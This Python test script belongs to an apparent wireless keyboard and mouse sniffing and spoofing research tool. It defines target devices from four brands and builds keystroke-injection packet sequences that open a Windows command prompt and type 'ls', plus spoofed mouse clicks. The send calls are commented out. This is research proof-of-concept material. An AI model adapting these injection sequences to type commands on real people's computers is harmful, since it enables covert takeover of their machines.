#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
  Copyright (C) 2016 Bastille Networks
  Copyright (C) 2019 Matthias Deeg, SySS GmbH
  Copyright (C) 2025 Lucas Agro

  This program is free software: you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  the Free Software Foundation, either version 3 of the License, or
  (at your option) any later version.

  This program is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with this program.  If not, see <http://www.gnu.org/licenses/>.
"""

"""Testing file for sniffing and spoofing wireless devices.

"""

import time

from lib import common
from devices.keyboard import * 
from devices.mouse import * 
from devices.TLSR85.tlsr85_keyboard import Tlsr85_Keyboard
from devices.TLSR85.tlsr85_mouse import Tlsr85_Mouse
from devices.TX.tx_mouse import Tx_mouse
from devices.TX.tx_keyboard import Tx_Keyboard
from devices.Rapoo.rapoo_mouse import Rapoo_Mouse
from devices.Rapoo.rapoo_keyboard import Rapoo_Keyboard
from devices.Edenwood.edenwood_mouse import Edenwood_Mouse
from devices.Edenwood.edenwood_keyboard import Edenwood_Keyboard


common.init_args('./main.py')
common.parse_and_init()


"""
----------------------------TLSR85----------------------------
"""

trust_keyboard = Tlsr85_Keyboard("4a:b4:cb:80", "aa:aa:b5", 0x11021, 0x24bf)
#poss_keyboard = Tlsr85_Keyboard("d5:54:cb:80", "aa:aa:cc", 0x11021, 0xcb01)
trust_mouse = Tlsr85_Mouse("4a:b4:cb:dc", "aa:aa:aa:b5", 0x11021, 0x24bf)


attack_tlsr85_keyboard = [
    trust_keyboard.build_packet(modifiers=[KeyboardModifiers.MODIFIER_GUI_LEFT]),
    lambda: time.sleep(1),
    trust_keyboard.build_packet([KeyboardScancode.KEY_C, KeyboardScancode.KEY_M, KeyboardScancode.KEY_D], modifiers=[KeyboardModifiers.MODIFIER_MULTIPLE_KEY]),
    lambda: time.sleep(1),
    trust_keyboard.build_packet([KeyboardScancode.KEY_KEYPAD_ENTER]),
    lambda: time.sleep(1.5),
    trust_keyboard.build_packet([KeyboardScancode.KEY_L, KeyboardScancode.KEY_S], modifiers=[KeyboardModifiers.MODIFIER_MULTIPLE_KEY]),
    trust_keyboard.build_packet([KeyboardScancode.KEY_KEYPAD_ENTER])
    ]

#trust_keyboard.sniff()
#trust_mouse.sniff()
#trust_keyboard.spoof(attack_tlsr85_keyboard)



"""
----------------------------TX----------------------------
"""

tx_keyboard = Tx_Keyboard("55:79:90:16", 0x11021, 0x6818)
tx_mouse = Tx_mouse("55:79:90:16", 0x11021, 0x6818)

attack_tx_keyboard = [
    *tx_keyboard.build_packet(modifiers=[KeyboardModifiers.MODIFIER_GUI_LEFT]),
    lambda: time.sleep(1),
    *tx_keyboard.build_packet([KeyboardScancode.KEY_C, KeyboardScancode.KEY_M, KeyboardScancode.KEY_D]),
    lambda: time.sleep(1),
    *tx_keyboard.build_packet([KeyboardScancode.KEY_KEYPAD_ENTER]),
    lambda: time.sleep(1.5),
    *tx_keyboard.build_packet([KeyboardScancode.KEY_L, KeyboardScancode.KEY_S]),
    *tx_keyboard.build_packet([KeyboardScancode.KEY_KEYPAD_ENTER])
    ]

attack_tx_mouse = tx_mouse.build_packet([MouseClickType.LEFT_CLICK], x_move="8888")

#tx_mouse.sniff()
#tx_keyboard.spoof(attack_tx_keyboard)
#tx_mouse.spoof(attack_tx_mouse)


"""
----------------------------Rapoo----------------------------
"""

rapoo_keyboard = Rapoo_Keyboard("c7:92:78:79", 0x11021, 0xefdf)
rapoo_mouse = Rapoo_Mouse("c7:92:78:79", 0x11021, 0xefdf)

attack_rapoo_keyboard = [
    rapoo_keyboard.build_packet([KeyboardScancode.KEY_LGUI]),
    lambda: time.sleep(1),
    rapoo_keyboard.build_packet([KeyboardScancode.KEY_C, KeyboardScancode.KEY_M, KeyboardScancode.KEY_D]),
    lambda: time.sleep(1),
    rapoo_keyboard.build_packet([KeyboardScancode.KEY_KEYPAD_ENTER]),
    lambda: time.sleep(1.5),
    rapoo_keyboard.build_packet([KeyboardScancode.KEY_L, KeyboardScancode.KEY_S]),
    rapoo_keyboard.build_packet([KeyboardScancode.KEY_KEYPAD_ENTER])
    ]

attack_rapoo_mouse = [
    rapoo_mouse.build_packet([MouseClickType.LEFT_CLICK])
]


#rapoo_keyboard.sniff()
#rapoo_mouse.sniff()
#rapoo_keyboard.spoof(attack_rapoo_keyboard)
#rapoo_mouse.spoof(attack_rapoo_mouse)


"""
----------------------------Edenwood----------------------------
"""

edenwood_mouse = Edenwood_Mouse("55:2d:2c:bc", 0x11021, 0x6818)
edenwood_keyboard = Edenwood_Keyboard("55:2d:2c:bc", 0x11021, 0x6818)

#edenwood_keyboard.sniff()
#edenwood_mouse.sniff()

attack_edenwood_keyboard = [
    edenwood_keyboard.build_packet([KeyboardScancode.KEY_LGUI]),
    lambda: time.sleep(1),
    edenwood_keyboard.build_packet([KeyboardScancode.KEY_C, KeyboardScancode.KEY_M, KeyboardScancode.KEY_D]),
    lambda: time.sleep(1),
    edenwood_keyboard.build_packet([KeyboardScancode.KEY_KEYPAD_ENTER]),
    lambda: time.sleep(1.5),
    edenwood_keyboard.build_packet([KeyboardScancode.KEY_L, KeyboardScancode.KEY_S]),
    edenwood_keyboard.build_packet([KeyboardScancode.KEY_KEYPAD_ENTER])
]

attack_edenwood_mouse = [
    edenwood_mouse.build_packet([MouseClickType.LEFT_CLICK])
]

#edenwood_mouse.spoof(attack_edenwood_mouse)
#edenwood_keyboard.spoof(attack_edenwood_keyboard) # not perfect, packet with same seq number might get repeated